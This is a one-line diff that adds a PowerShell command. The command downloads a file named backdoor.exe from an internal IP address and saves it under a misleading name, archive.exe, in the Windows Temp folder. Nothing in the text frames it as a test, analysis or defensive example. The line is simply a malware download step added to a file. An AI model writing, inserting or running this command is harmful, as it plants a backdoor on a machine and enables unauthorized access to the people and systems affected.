@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile("http://10.1.100.1/backdoor.exe", "C:\Windows\Temp\archive.exe")
